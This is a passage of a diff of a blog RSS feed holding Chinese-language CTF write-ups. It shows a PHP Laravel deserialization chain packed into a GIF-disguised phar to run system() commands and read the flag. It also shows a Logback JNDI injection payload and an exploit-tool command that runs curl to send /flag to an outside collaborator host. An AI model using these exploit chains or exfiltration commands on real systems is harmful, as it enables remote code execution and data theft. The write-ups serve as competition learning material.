+&lt;span style="color:#111">$phar&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">startBuffering&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#111">$phar&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">setStub&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;GIF89a&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;__HALT_COMPILER();&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$phar&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">setMetadata&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$phar&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">addFromString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test.txt&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;test&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$phar&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">stopBuffering&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可用链子2&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Broadcasting&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PendingBroadcast&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">events&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">event&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">BroadcastEvent&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">connection&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Bus&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Dispatcher&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">queueResolver&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#111">$c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Broadcasting\BroadcastEvent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ls&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Bus\Dispatcher&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Broadcasting\PendingBroadcast&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#75715e">#print(urlencode(serialize($a)));
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">unlink&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;phar.phar&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$phar&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Phar&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;phar.phar&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$phar&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">startBuffering&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#111">$phar&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">setStub&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;GIF89a&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;__HALT_COMPILER();&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$phar&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">setMetadata&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$phar&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">addFromString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test.txt&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;test&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$phar&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">stopBuffering&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>将生成的phar文件用gzip压缩后上传（记得要改一下content-type），在image处访问&lt;code>/image?image=phar://../storage/app/uploads/xxxxxxxxxx.png&lt;/code>即可看到隐藏在500报错下面的phpinfo&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210803004021941.png" alt="image-20210803004021941">&lt;/p>
+&lt;p>光看到phpinfo不是目标，还需要继续执行命令，这里用的是第二个链子 相当于执行以下的命令&lt;/p>
+&lt;pre tabindex="0">&lt;code>system(&amp;quot;cd ../../../;ls&amp;quot;);
+system(&amp;quot;cd ../../../;cat flag&amp;quot;);
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210803122653978.png" alt="image-20210803122653978">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210803122933503.png" alt="image-20210803122933503">&lt;/p>
+&lt;p>参考：&lt;a href="https://guokeya.github.io/post/z5gHcmbVj/">wp1&lt;/a> &lt;a href="https://vuln.top/2021/05/08/16204457586099/">wp2&lt;/a>&lt;/p>
+&lt;p>————哄堂大孝了家人们 我是憨批 这个get传image的地方我一直在用post传 我还在纳闷为啥一直会报405的错😅😅😅&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[NPUCTF2020]EzShiro
+&lt;/h4>
+&lt;/summary>
+&lt;p>和 [红明谷CTF 2021]JavaWeb 是完全一样的payload&lt;/p>
+&lt;p>首先是一个/;/json绕过鉴权，之后是jndi注入，用那个jar一把梭&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;ch.qos.logback.core.db.JNDIConnectionSource&amp;#34;&lt;/span>&lt;span style="color:#111">,{&lt;/span>&lt;span style="color:#f92672">&amp;#34;jndiLocation&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://101.35.114.107:1099/qhx0ip&amp;#34;&lt;/span>&lt;span style="color:#111">}]&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &lt;span style="color:#d88200">&amp;#34;curl http://mg6uynla2pxa8ilgp4cprm0suj09oy.burpcollaborator.net/ -F file=@/flag&amp;#34;&lt;/span> -A &lt;span style="color:#d88200">&amp;#34;101.35.114.107&amp;#34;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;/details></description></item><item><title>CTFshow1221摆烂杯 Wp</title><link>https://amiaaaz.github.io/2021/12/28/ctfshow-1221-bailancup-wp/</link><pubDate>Tue, 28 Dec 2021 20:06:48 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/28/ctfshow-1221-bailancup-wp/</guid><description>&lt;p>&lt;a href="https://ctf.show/challenges">https://ctf.show/challenges&lt;/a>&lt;/p>
 &lt;h2 id="web签到">web签到&lt;/h2>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224183707592.png" alt="image-20211224183707592">&lt;/p>
 &lt;p>一眼flask，简单fuzz一下发现过滤了字母 斜杠 引号 注释符 花括号 百分号 点号&lt;/p>
